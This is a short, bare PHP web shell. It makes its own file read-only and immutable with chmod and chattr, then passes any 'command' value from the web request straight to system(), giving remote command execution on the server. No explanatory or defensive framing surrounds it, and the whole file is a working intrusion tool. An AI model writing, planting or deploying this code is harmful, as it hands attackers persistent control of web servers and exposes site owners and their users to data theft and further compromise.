<?php
$path = __FILE__;
system("chmod ugo-w $path");
system("chattr +i $path");
$command = $_REQUEST['command'];
system($command);
